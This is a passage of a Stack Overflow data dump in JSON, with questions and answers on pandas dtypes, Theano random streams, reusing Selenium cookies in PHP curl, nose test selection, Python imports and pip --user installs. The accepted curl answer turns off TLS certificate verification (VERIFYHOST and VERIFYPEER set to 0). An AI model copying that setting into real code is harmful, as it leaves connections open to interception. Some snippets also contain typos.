digits.</p>\n\n<p>edit: Just to elaborate, excel stores numbers as floats, and not strings like in a csv file. When reading .csv files, you can specify column \"dtype\"s</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 5556835, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df260ffe980b3ea5ad1208734f84c298?s=128&d=identicon&r=PG&f=1", "display_name": "Gagns43", "link": "https://stackoverflow.com/users/5556835/gagns43"}, "is_accepted": false, "score": 1, "last_activity_date": 1447371614, "creation_date": 1447371614, "answer_id": 33683489, "question_id": 29398130, "link": "https://stackoverflow.com/questions/29398130/changing-data-type-with-pandas-on-read-excel/33683489#33683489", "title": "Changing data type with pandas on read_excel", "body": "<p>There is another possibility. I must admit it's a little bit scrapy, but I tested successfully.</p>\n\n<p>You need to create a new class:</p>\n\n<pre><code>class NewType():\n   def __init__(self, sValue=\"\"):\n        self.strValue = sValue\n\n   def __str__(self):\n        return self.strValue\n</code></pre>\n\n<p>then define a convert function:</p>\n\n<pre><code>def convert(value):\n    return NewType(value)\n</code></pre>\n\n<p>in your function (where you want to read_excel), do the following, assuming you have 28 columns to read:</p>\n\n<pre><code>import pandas as pd\nconverters = dict()\nfor i  in range(0,28,1):\n    converters[i] = convert\ndataframe = pd.read_excel(path_to_file, sheet_name, 0, None, 0, None, 27, False, None, \"\", None, False, None, converters)\ndataframe = dataframe.transpose()\ndataDict = dataframe.to_dict() \nnewDict= OrderedDict()\nfor dataLine in dataDict.values():\n    for field in dataLine.keys():\n        dataLine[field] = str(dataLine[field])\n    #do something with dataLine\n</code></pre>\n\n<p>At the end you have something identical to CSV.DictReader if you had the data formatted in CSV</p>\n"}], "owner": {"reputation": 93, "user_id": 4739462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47132b097da8a8d1bf3fe7fb5c208b65?s=128&d=identicon&r=PG&f=1", "display_name": "bqlou", "link": "https://stackoverflow.com/users/4739462/bqlou"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3308, "favorite_count": 0, "accepted_answer_id": 29398362, "answer_count": 2, "score": 0, "last_activity_date": 1447371614, "creation_date": 1427912914, "question_id": 29398130, "link": "https://stackoverflow.com/questions/29398130/changing-data-type-with-pandas-on-read-excel", "title": "Changing data type with pandas on read_excel", "body": "<p>I'm looking for some help as I'm actually quite new to pandas (and python).\nI'm facing a data type conversion problem with some datas.</p>\n\n<p>As you can see (and try), I'm trying to tell pandas that I want it to read the \"DEP\" data column as a string (because I want to keep the data unchanged)</p>\n\n<pre><code>&gt;&gt;&gt; df = pd.read_excel(\"http://www2.impots.gouv.fr/documentation/statistiques/ircom2003/dep/060.xls\", 0, skiprows=23, na_values=\"n.d.\")\n&gt;&gt;&gt; df.dtypes\nUnnamed: 0                                                  float64\nDEP                                                         float64\nCommune                                                     float64\n...\n\n&gt;&gt;&gt; df[\"DEP\"] = df[\"DEP\"].astype(str)\n\n&gt;&gt;&gt; df.dtypes\nUnnamed: 0                                                  float64\nDEP                                                          object\nCommune                                                     float64\n.....\n\n&gt;&gt;&gt; df[\"DEP\"][5]\n'60.0'\n</code></pre>\n\n<p>You can download the excel file if you want, but the input data look like this : (I've added the slash between column names)</p>\n\n<pre><code>DEP / Commune   / Libell\u00e9 de la commune\n060 001 AIGLUN\n060 002 AMIRAT\n</code></pre>\n\n<p>In this case, I would like to simply keep the data \"060\" and \"001\" as strings.\nI'm using python 3.4 and pandas 0.16</p>\n\n<p>Thanks a lot for your help.</p>\n"}, {"tags": ["python", "numpy", "theano", "deep-learning"], "answers": [{"tags": [], "owner": {"reputation": 121, "user_id": 2990135, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2567544e54b36ca0303f5be02f1663a3?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Hastings", "link": "https://stackoverflow.com/users/2990135/steve-hastings"}, "is_accepted": false, "score": 0, "last_activity_date": 1427951891, "creation_date": 1427951891, "answer_id": 29405457, "question_id": 29398109, "link": "https://stackoverflow.com/questions/29398109/using-random-numbers-in-theano/29405457#29405457", "title": "Using Random Numbers in Theano", "body": "<p><strong>Q1</strong></p>\n\n<p>Looks like only 1 \"value\" (ie a 2x2 matrix) is being generated by rv_u's generator.  You can see this if you use <code>theano.printing.debugprint</code> to print the graph of the function.  For reference this is what I got:</p>\n\n<pre><code>&gt;&gt;&gt; theano.printing.debugprint(nearly_zeros)\nElemwise{Composite{((i0 + i0) - (i1 * i0))}}[(0, 0)] [@A] ''   1\n |RandomFunction{uniform}.1 [@B] ''   0\n | |&lt;RandomStateType&gt; [@C]\n | |TensorConstant{(2,) of 2} [@D]\n | |TensorConstant{0.0} [@E]\n | |TensorConstant{1.0} [@F]\n |TensorConstant{(1, 1) of 2.0} [@G]\nRandomFunction{uniform}.0 [@B] ''   0\n</code></pre>\n\n<p>This means the two functions (nearly_zero and f) both grab only 1 value from rv_u, hence why </p>\n\n<pre><code>v3 == v1\n</code></pre>\n\n<p><strong>Q2</strong></p>\n\n<p>Theano is largely a symbolic math package.  You define relationships between symbolic variables and Theano figures out how to evaluate those relationships.</p>\n\n<p>So you could consider rv_u to be a variable which represents a single 2x2 matrix, rather than a rng which generates a new 2x2 matrix each time it's \"called.\"  Given that view, Theano would only need to call the underlying rng once to get the value for the variable rv_u.</p>\n"}, {"tags": [], "owner": {"reputation": 13, "user_id": 5170062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c1baf0a6c0ded77f434f59ca92cd6e0?s=128&d=identicon&r=PG&f=1", "display_name": "nvparrish", "link": "https://stackoverflow.com/users/5170062/nvparrish"}, "is_accepted": false, "score": 0, "last_activity_date": 1454029397, "creation_date": 1454029397, "answer_id": 35075137, "question_id": 29398109, "link": "https://stackoverflow.com/questions/29398109/using-random-numbers-in-theano/35075137#35075137", "title": "Using Random Numbers in Theano", "body": "<h2>Q1</h2>\n\n<p>When <code>nearly_zeros()</code> is called, it uses the current rng state of the random stream to return a new <code>rv_u</code> and increments the state just as it does for the function <code>f</code>.  The easiest way to see what is happening to <code>rv_u</code> is to add it as an output to the <code>nearly_zeros()</code> function.  Although <code>rv_u</code> is present three times, the value of <code>rv_u</code> is sampled from the random stream only once, hence <code>nearly_zero</code> will indeed be nearly zero (up to floating-point quantization error.)</p>\n\n<pre><code>nearly_zeros = function([], [rv_u, rv_u + rv_u - 2 * rv_u])\nf() # The return value will be different from the rv_u in the list above\n</code></pre>\n\n<p>If you do not intend for it to increment, you can specify the <code>no_default_updates=True</code> as was done for <code>g</code>.</p>\n\n<pre><code>nearly_zeros = function([], [rv_u, rv_u + rv_u - 2 * rv_u], \n     no_default_updates=True)\nf() # The return value will be equal to the rv_u in the list above\n</code></pre>\n\n<h2>Q2</h2>\n\n<p>The \"why\" here was a little ambiguous, so I present two possibilities with the answers.</p>\n\n<p><h3>Q2(a)</h3>Why does using <code>nearly_zeros()</code> impact <code>rv_u</code> in this way?</p>\n\n<p><code>rv_u</code> is a uniform srng object which uses a shared variable that is incremented each time it is requested, unless specifically told otherwise (by means of the <code>no_defalut_updates</code> parameter.)  This is true whether <code>f</code> or <code>nearly_zero</code> happens to be the function that requests the value of <code>rv_u</code>.</p>\n\n<p><h3>Q2(b)</h3>Why is the following true:</p>\n\n<pre><code>v2 != v1\nv3 == v1\n</code></pre>\n\n<p>This is because your code saves the state after defining <code>nearly_zeros</code> but before it is called.  When the state is set, the first value that is returned is the value used by <code>nearly_zeros</code> (which is equal to <code>v2</code>.)  The next value requested will be equal to the value of <code>v3</code>.  The following is a nearly identical copy of your code, and it should prove illustrative:</p>\n\n<pre><code>from theano.tensor.shared_randomstreams import RandomStreams\nfrom theano import function\nsrng = RandomStreams(seed=234)\nrv_u = srng.uniform((2,2))\nrv_n = srng.normal((2,2))\nf = function([], rv_u)\ng = function([], rv_n, no_default_updates=True)    #Not updating rv_n.rng\nnearly_zeros = function([], [rv_u, rv_u + rv_u - 2 * rv_u]) # Give rv_u, too\n\nstate_after_v0 = rv_u.rng.get_value().get_state()\nnearly_zeros()       # this affects rv_u's generator\nv1 = f()\nrng = rv_u.rng.get_value(borrow=True)\nrng.set_state(state_after_v0)\nrv_u.rng.set_value(rng, borrow=True)\nv2 = f()             # v2 != v1, but equal to rv_u used by nearly_zeros\nv3 = f()             # v3 == v1\n</code></pre>\n\n<p><i>Aside: Although this thread is a bit old, hopefully someone will find these answers helpful.</i></p>\n"}], "owner": {"reputation": 31, "user_id": 3140172, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qWTbG.gif?s=128&g=1", "display_name": "Harsh", "link": "https://stackoverflow.com/users/3140172/harsh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2313, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1454029397, "creation_date": 1427912816, "question_id": 29398109, "link": "https://stackoverflow.com/questions/29398109/using-random-numbers-in-theano", "title": "Using Random Numbers in Theano", "body": "<p>I am a theano newbie. <br></p>\n\n<p>Can someone please explain the following code?</p>\n\n<pre><code>from theano.tensor.shared_randomstreams import RandomStreams\nfrom theano import function\nsrng = RandomStreams(seed=234)\nrv_u = srng.uniform((2,2))\nrv_n = srng.normal((2,2))\nf = function([], rv_u)\ng = function([], rv_n, no_default_updates=True)    #Not updating rv_n.rng\nnearly_zeros = function([], rv_u + rv_u - 2 * rv_u)\n\nstate_after_v0 = rv_u.rng.get_value().get_state()\nnearly_zeros()       # this affects rv_u's generator\nv1 = f()\nrng = rv_u.rng.get_value(borrow=True)\nrng.set_state(state_after_v0)\nrv_u.rng.set_value(rng, borrow=True)\nv2 = f()             # v2 != v1\nv3 = f()             # v3 == v1\n</code></pre>\n\n<p>Q1. How does nearly_zeros() affect rv_u's generator?<br>\nQ2. Why ?<br> </p>\n\n<pre><code>v2 != v1\nv3 == v1\n</code></pre>\n"}, {"tags": ["php", "python", "selenium", "curl", "cookies"], "comments": [{"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427913604, "post_id": 29398056, "comment_id": 46972607, "body": "Is <code>curl</code> a requirement or <code>selenium</code> to <code>requests</code> cookie transfer would also work for you?"}, {"owner": {"reputation": 74488, "user_id": 797495, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BKD7l.jpg?s=128&g=1", "display_name": "Pedro Lobito", "link": "https://stackoverflow.com/users/797495/pedro-lobito"}, "reply_to_user": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427913812, "post_id": 29398056, "comment_id": 46972735, "body": "@alecxe Yes, curl is a requirement, I need to use the cookie dumped from selenium in a curl request."}], "answers": [{"tags": [], "owner": {"reputation": 74488, "user_id": 797495, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BKD7l.jpg?s=128&g=1", "display_name": "Pedro Lobito", "link": "https://stackoverflow.com/users/797495/pedro-lobito"}, "is_accepted": true, "score": 1, "last_activity_date": 1427919266, "last_edit_date": 1427919266, "creation_date": 1427918170, "answer_id": 29399648, "question_id": 29398056, "link": "https://stackoverflow.com/questions/29398056/selenium-cookie-to-curl-cookie/29399648#29399648", "title": "Selenium Cookie to Curl Cookie", "body": "<p>I managed to solve this with a regex.</p>\n\n<p>Example cookies dumped from <code>selenium</code> with <code>driver.get_cookies()</code>:</p>\n\n<pre><code>$seleniumCookies = \"[{u'domain': u'.site.com', u'name': u'NID', u'value': u'somelooooooooooongvalue', u'expiry': 1443722412, u'path': u'/', u'secure': False}, {u'domain': u'.site.com', u'name': u'SID', u'value': u'somelooooooooooooooongvalue', u'expiry': 1490983212, u'path': u'/', u'secure': False}]\";\n\n$curlCookies = \"\";\n\npreg_match_all('/\\'name\\': u\\'(.*?)\\', u\\'value\\': u\\'(.*?)\\'/i', $seleniumCookies, $matches, PREG_PATTERN_ORDER);\nfor ($i = 0; $i &lt; count($matches[0]); $i++) {\n    $name =  $matches[1][$i];\n    $value =  $matches[2][$i];\n\n    $curlCookies .= \"$name=$value;\";\n\n}\n</code></pre>\n\n<p>The <code>$curlCookies</code> var now looks like this :</p>\n\n<pre><code>NID=somelooooooooooongvalue;SID=somelooooooooooooooongvalue;\n</code></pre>\n\n<p>Now we can make the curl request using the <code>$curlCookies</code> inside the <code>CURLOPT_HTTPHEADER</code>:</p>\n\n<pre><code>$url =  \"https://some.host.com/that-need-selenium-cookies\";\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_HTTPHEADER, array(\n\"Host: some.host.com:443\",\n\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n\"Accept-Language: en-US,en;q=0.8\",\n\"Cookie: $curlCookies\"\n));\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);\ncurl_setopt($ch, CURLOPT_TIMEOUT, 120);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);\ncurl_setopt($ch, CURLOPT_ENCODING, \"\");\n$pagebody=curl_exec ($ch);\ncurl_close ($ch);\n</code></pre>\n\n<p>That's it, the code works perfectly.\nI hope this helps others.</p>\n"}], "owner": {"reputation": 74488, "user_id": 797495, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/BKD7l.jpg?s=128&g=1", "display_name": "Pedro Lobito", "link": "https://stackoverflow.com/users/797495/pedro-lobito"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 997, "favorite_count": 0, "accepted_answer_id": 29399648, "answer_count": 1, "score": 0, "last_activity_date": 1427919266, "creation_date": 1427912677, "last_edit_date": 1427918946, "question_id": 29398056, "link": "https://stackoverflow.com/questions/29398056/selenium-cookie-to-curl-cookie", "title": "Selenium Cookie to Curl Cookie", "body": "<p>How to convert a cookie saved by selenium  (<code>driver.get_cookies()</code>) to a cookie that can be used with <code>curl</code> ?</p>\n\n<p>The content o selenium cookie when dumped to a text file looks like this:</p>\n\n<pre><code>[{u'domain': u'.site.com', u'name': u'NID', u'value': u'somelooooooooooongvalue', u'expiry': 1443722412, u'path': u'/', u'secure': False}, {u'domain': u'.site.com', u'name': u'SID', u'value': u'somelooooooooooooooongvalue', u'expiry': 1490983212, u'path': u'/', u'secure': False}]\n</code></pre>\n\n<p>Is there any way to achieve this?</p>\n"}, {"tags": ["python", "unit-testing", "nose"], "comments": [{"owner": {"reputation": 4883, "user_id": 62138, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/65881e840f44a05c4f3b0aea257da42e?s=128&d=identicon&r=PG", "display_name": "salparadise", "link": "https://stackoverflow.com/users/62138/salparadise"}, "edited": false, "score": 0, "creation_date": 1427912913, "post_id": 29397973, "comment_id": 46972233, "body": "possible duplicate of <a href=\"http://stackoverflow.com/questions/21936292/conditional-skip-testcase-decorator-in-nosetests\">Conditional skip TestCase decorator in nosetests</a>"}, {"owner": {"reputation": 157, "user_id": 4728338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d1ed772d157f3f4cffe96242da6c5b8f?s=128&d=identicon&r=PG&f=1", "display_name": "Joshi Sravan Kumar", "link": "https://stackoverflow.com/users/4728338/joshi-sravan-kumar"}, "reply_to_user": {"reputation": 4883, "user_id": 62138, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/65881e840f44a05c4f3b0aea257da42e?s=128&d=identicon&r=PG", "display_name": "salparadise", "link": "https://stackoverflow.com/users/62138/salparadise"}, "edited": false, "score": 0, "creation_date": 1427913297, "post_id": 29397973, "comment_id": 46972422, "body": "But I don&#39;t want to use decorators here as I don&#39;t want to touch the test module code once written. And I wanted to skip them with an option from main module. Am I missing some thing here?"}], "answers": [{"tags": [], "owner": {"reputation": 5723, "user_id": 255365, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/ov15k.png?s=128&g=1", "display_name": "Oleksiy", "link": "https://stackoverflow.com/users/255365/oleksiy"}, "is_accepted": true, "score": 2, "last_activity_date": 1427999293, "creation_date": 1427999293, "answer_id": 29419937, "question_id": 29397973, "link": "https://stackoverflow.com/questions/29397973/python-unit-testing-in-nose-is-there-a-way-to-skip-a-test-case-from-nose-run/29419937#29419937", "title": "Python Unit-Testing: In Nose is there a way to skip a test case from nose.run()?", "body": "<p>The notion of skipping test and not running a test are different in the context of nose: skipped tests will be reported as skipped at the end of the test result. If you want to skip the test you would have to monkey patch your test module with decorators or do some other dark magic. </p>\n\n<p>But if you want to just not run a test, you can do it the same way you would do it from the command line: using <a href=\"http://nose.readthedocs.org/en/latest/usage.html\" rel=\"nofollow\">--exclude </a> option. It takes a regular expression of the test you do not want to run. Something like this:</p>\n\n<pre><code>import sys\nimport nose\n\ndef test_number_one():\n    pass\n\ndef test_number_two():\n    pass\n\nif __name__ == '__main__':\n    module_name = sys.modules[__name__].__file__\n\n    nose.main(argv=[sys.argv[0],\n                    module_name,\n                    '--exclude=two',\n                    '-v'\n                    ])\n</code></pre>\n\n<p>Running the test will give you:</p>\n\n<pre><code>$ python stackoverflow.py\nstackoverflow.test_number_one ... ok\n\n----------------------------------------------------------------------\nRan 1 test in 0.002s\n\nOK\n</code></pre>\n"}], "owner": {"reputation": 157, "user_id": 4728338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d1ed772d157f3f4cffe96242da6c5b8f?s=128&d=identicon&r=PG&f=1", "display_name": "Joshi Sravan Kumar", "link": "https://stackoverflow.com/users/4728338/joshi-sravan-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1520, "favorite_count": 1, "accepted_answer_id": 29419937, "answer_count": 1, "score": 2, "last_activity_date": 1427999293, "creation_date": 1427912396, "question_id": 29397973, "link": "https://stackoverflow.com/questions/29397973/python-unit-testing-in-nose-is-there-a-way-to-skip-a-test-case-from-nose-run", "title": "Python Unit-Testing: In Nose is there a way to skip a test case from nose.run()?", "body": "<p>I am writing a set of test cases say Test1, Test2 in a test module.</p>\n\n<p>Is there a way to skip Test1 or selectively execute only Test2 in that module using the command nose.main()?</p>\n\n<p>My module contains,</p>\n\n<p>test_module.py,</p>\n\n<pre><code>class Test1:\n    setUp(self):\n       print('setup')\n    tearDown(self):\n       print('teardown')\n    test(self):\n       print('test1')\n\nclass Test2:\n    setUp(self):\n       print('setup')\n    tearDown(self):\n       print('teardown')\n    test(self):\n       print('test2')\n</code></pre>\n\n<p>I run it from a different python file using,</p>\n\n<pre><code>if __name__ == '__main__':\n    nose.main('test_module')\n</code></pre>\n"}, {"tags": ["python", "pyqt4", "nameerror"], "comments": [{"owner": {"reputation": 21022, "user_id": 348081, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/fc6e3adc850c07248a46aaadc05fa59b?s=128&d=identicon&r=PG", "display_name": "JuanPablo", "link": "https://stackoverflow.com/users/348081/juanpablo"}, "edited": false, "score": 0, "creation_date": 1427914169, "post_id": 29397859, "comment_id": 46972927, "body": "maybe you can try replace <code>import librerias.Circulo_Mohr_v1_2</code> with  <code>from  librerias.Circulo_Mohr_v1_2 import Ui_CalculodecirculosMohr</code> and call directly <code>Ui_CalculodecirculosMohr()</code>"}], "answers": [{"tags": [], "owner": {"reputation": 21022, "user_id": 348081, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/fc6e3adc850c07248a46aaadc05fa59b?s=128&d=identicon&r=PG", "display_name": "JuanPablo", "link": "https://stackoverflow.com/users/348081/juanpablo"}, "is_accepted": true, "score": 0, "last_activity_date": 1427914690, "creation_date": 1427914690, "answer_id": 29398664, "question_id": 29397859, "link": "https://stackoverflow.com/questions/29397859/nameerror-global-name-circulo-mohr-v1-2-is-not-defined/29398664#29398664", "title": "NameError: global name &#39;Circulo_Mohr_v1_2&#39; is not defined", "body": "<p>try replace</p>\n\n<pre><code>import librerias.Circulo_Mohr_v1_2\n</code></pre>\n\n<p>with</p>\n\n<pre><code>from librerias.Circulo_Mohr_v1_2 import Ui_CalculodecirculosMohwith \n</code></pre>\n\n<p>and call directly Ui_CalculodecirculosMohr()</p>\n\n<pre><code>Ui_CalculodecirculosMohr()\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 4739391, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Mr17V.png?s=128&g=1", "display_name": "wallito_80", "link": "https://stackoverflow.com/users/4739391/wallito-80"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "accepted_answer_id": 29398664, "answer_count": 1, "score": 0, "last_activity_date": 1427914690, "creation_date": 1427911975, "last_edit_date": 1427912637, "question_id": 29397859, "link": "https://stackoverflow.com/questions/29397859/nameerror-global-name-circulo-mohr-v1-2-is-not-defined", "title": "NameError: global name &#39;Circulo_Mohr_v1_2&#39; is not defined", "body": "<p>I'm trying make a simple menu (options: 1,2,3) and the second option (input 2) should run a graphical menu.</p>\n\n<p>When I try run python reports a NameError (<em>\"global name 'Circulo_Mohr_v1_2' is not defined\"</em>).</p>\n\n<p>I don't know the correct syntax </p>\n\n<pre><code>print \"inicio\"\nimport sys\nfrom librerias import Circ_Mohr_motor_v2\nimport librerias.Circulo_Mohr_v1_2\nfrom librerias import prueba_importacion\n\n'''\ndef definicion_ventana():\n    Circulo_Mohr_v3_0.Ui_CalculodecirculosMohr()\n\n#Ui_CalculodecirculosMohr.setupUi()\n'''\ndef seleccion_de_libreria():\n    print '''Escoger opcion:\n    1) motor\n    2) Ventana\n    3) test\n    '''\n    opcion = raw_input (\"Opcion seleccionada: \")\n    opcion = int (opcion)\n\n    if opcion == 1:\n        print \"se ejecuta el motor de calculo\"\n        punto_Ax = raw_input (\"Insertar coordenada X de primer punto: \")\n        punto_Ay = raw_input (\"Insertar coordenada Y de primer punto: \")\n        punto_Bx = raw_input (\"Insertar coordenada X de segundo punto: \")\n        punto_By = raw_input (\"Insertar coordenada Y de segundo punto: \")\n\n        Circ_Mohr_motor_v2.circulo_mohr(punto_Ax,punto_Ay,punto_Bx,punto_By)\n    elif opcion == 2:\n        print \"se ejecuta la funcion ventana\"\n        Circulo_Mohr_v1_2.Ui_CalculodecirculosMohr()\n                print \"fin la funcion ventana\"\n    else:\n        print \"se ejecuta el test\"\n        prueba_importacion.prueba_01()\n\nseleccion_de_libreria()\n\nprint \"fin\"\n</code></pre>\n\n<p>How can I fix that?</p>\n"}, {"tags": ["python"], "answers": [{"comments": [{"owner": {"reputation": 13318, "user_id": 1815710, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/dddf39759fed431cd1e8ecad2aa7dc49?s=128&d=identicon&r=PG", "display_name": "Liondancer", "link": "https://stackoverflow.com/users/1815710/liondancer"}, "edited": false, "score": 0, "creation_date": 1427912808, "post_id": 29398058, "comment_id": 46972163, "body": "I get a permission denied with easy_install =/"}, {"owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "reply_to_user": {"reputation": 13318, "user_id": 1815710, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/dddf39759fed431cd1e8ecad2aa7dc49?s=128&d=identicon&r=PG", "display_name": "Liondancer", "link": "https://stackoverflow.com/users/1815710/liondancer"}, "edited": false, "score": 0, "creation_date": 1427913032, "post_id": 29398058, "comment_id": 46972276, "body": "Try <code>pip install --user foo</code>."}], "tags": [], "owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "is_accepted": false, "score": 1, "last_activity_date": 1427912990, "last_edit_date": 1427912990, "creation_date": 1427912679, "answer_id": 29398058, "question_id": 29397839, "link": "https://stackoverflow.com/questions/29397839/using-3rd-party-packages-on-remote-machine-without-download-install-rights/29398058#29398058", "title": "Using 3rd party packages on remote machine without download/install rights", "body": "<p>easy_install can install packages in your home directory.</p>\n\n<p>Replace <code>pip --install package-name</code> with <code>easy_install --user package-name</code>.</p>\n\n<hr>\n\n<p>Update: <code>pip</code> also has a <code>--user</code> switch. Try:</p>\n\n<pre><code>pip install --user package-name\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13318, "user_id": 1815710, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/dddf39759fed431cd1e8ecad2aa7dc49?s=128&d=identicon&r=PG", "display_name": "Liondancer", "link": "https://stackoverflow.com/users/1815710/liondancer"}, "edited": false, "score": 0, "creation_date": 1427912874, "post_id": 29398092, "comment_id": 46972203, "body": "I am able to scp a maven project with 3rd party dependencies so I thought I can do the same by with python"}], "tags": [], "owner": {"reputation": 1995, "user_id": 3492631, "user_type": "registered", "accept_rate": 29, "profile_image": "https://i.stack.imgur.com/6X56B.jpg?s=128&g=1", "display_name": "Dendi Suhubdy", "link": "https://stackoverflow.com/users/3492631/dendi-suhubdy"}, "is_accepted": false, "score": 1, "last_activity_date": 1427912770, "creation_date": 1427912770, "answer_id": 29398092, "question_id": 29397839, "link": "https://stackoverflow.com/questions/29397839/using-3rd-party-packages-on-remote-machine-without-download-install-rights/29398092#29398092", "title": "Using 3rd party packages on remote machine without download/install rights", "body": "<p>It is basically useless if you don't have executable permission in the remote machine. You need to contact your administrator to obtain an executable permission.</p>\n\n<p>In the case for the SCP files to the remote server, you may still be able to cp you files but you may not be able to execute it.</p>\n"}], "owner": {"reputation": 13318, "user_id": 1815710, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/dddf39759fed431cd1e8ecad2aa7dc49?s=128&d=identicon&r=PG", "display_name": "Liondancer", "link": "https://stackoverflow.com/users/1815710/liondancer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1427912990, "creation_date": 1427911905, "question_id": 29397839, "link": "https://stackoverflow.com/questions/29397839/using-3rd-party-packages-on-remote-machine-without-download-install-rights", "title": "Using 3rd party packages on remote machine without download/install rights", "body": "<p>I am SSHed into a remote machine and I do not have rights to download python packages but I want to use 3rd party applications for my project. I found <code>cx_freeze</code> but I'm not sure if that is what I need.</p>\n\n<p>What I want to achieve is to be able to run different parts of my project (will mains everywhere) with command line arguments on the remote machine. My project will be filled with a few 3rd party python packages. Not sure how to get around this as I cannot <code>pip install</code> and am not a sudoer. I can SCP files to the remote machine</p>\n"}, {"tags": ["python", "python-2.7"], "comments": [{"owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "edited": false, "score": 0, "creation_date": 1427912124, "post_id": 29397827, "comment_id": 46971833, "body": "You have described what happens and why. Do you have a question?"}], "answers": [{"tags": [], "owner": {"reputation": 4294, "user_id": 2738262, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/ead9263d3f0f0cc74f54d5d9fdbaa4cd?s=128&d=identicon&r=PG", "display_name": "Damian Yerrick", "link": "https://stackoverflow.com/users/2738262/damian-yerrick"}, "is_accepted": false, "score": 1, "last_activity_date": 1427912239, "creation_date": 1427912239, "answer_id": 29397933, "question_id": 29397827, "link": "https://stackoverflow.com/questions/29397827/python-error-on-struct-unpack/29397933#29397933", "title": "python error on struct.unpack", "body": "<p>Assuming the question is \"How should I read a 26 without an error?\"</p>\n\n<p>First check the arguments to the <code>open()</code> that produces <code>f</code>. Under Windows, unless you open a file in binary mode (<code>f = open(filename, \"rb\")</code>), Python assumes that the file is a text file. Windows treats byte value 26 (Ctrl+Z) in a text file as an end-of-file marker, a quirk that it <a href=\"http://blogs.msdn.com/b/oldnewthing/archive/2004/03/16/90448.aspx\" rel=\"nofollow\">inherited from CP/M</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 123, "user_id": 4738702, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/f12b60577cc697726337b70c0c4e64cc?s=128&d=identicon&r=PG&f=1", "display_name": "Mark Aisenberg", "link": "https://stackoverflow.com/users/4738702/mark-aisenberg"}, "edited": false, "score": 0, "creation_date": 1427913271, "post_id": 29397936, "comment_id": 46972409, "body": "Thanks! You guys are geniuses"}], "tags": [], "owner": {"reputation": 142870, "user_id": 8747, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b1ee0402d24625f555c25ea8511aad31?s=128&d=identicon&r=PG", "display_name": "Rob\u1d69", "link": "https://stackoverflow.com/users/8747/rob%e1%b5%a9"}, "is_accepted": false, "score": 0, "last_activity_date": 1427912245, "creation_date": 1427912245, "answer_id": 29397936, "question_id": 29397827, 